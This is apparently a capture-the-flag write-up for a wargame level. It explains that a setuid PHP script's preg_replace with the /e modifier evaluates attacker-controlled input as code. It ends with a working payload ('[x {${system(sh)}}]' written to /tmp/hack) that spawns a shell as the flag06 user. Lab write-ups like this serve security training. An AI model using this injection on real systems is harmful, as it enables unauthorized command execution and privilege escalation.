## Solutions

First we have a php script
```php
#!/usr/bin/php
<?php
function y($m) { 
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m; 
}

function x($y, $z) {
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);
    return $a; 
}
```

It takes two arguments, the first is a file, the second is useless

the preg_replace function locate and transform a portion of string via regex.  
 - the first argument is used to locate the string.
 - the second argument is used to transform the string.  
 - the third argument is the actual string.

We see that the first preg_replace in the function x, has a /e in the first arguments
this /e change the behavior of the transformation and interpret the second argument as php code 
so we can execute code as user flag06 (flag06 is the owner of the php executable)  
Lets exploit this weakness!

```console
~$ echo '[x {${system(sh)}}]' > /tmp/hack
~$ ./level06 /tmp/hack /tmp/hack
```
WE ARE IN

```console
~$ whoami
flag06
~$ getflag
```
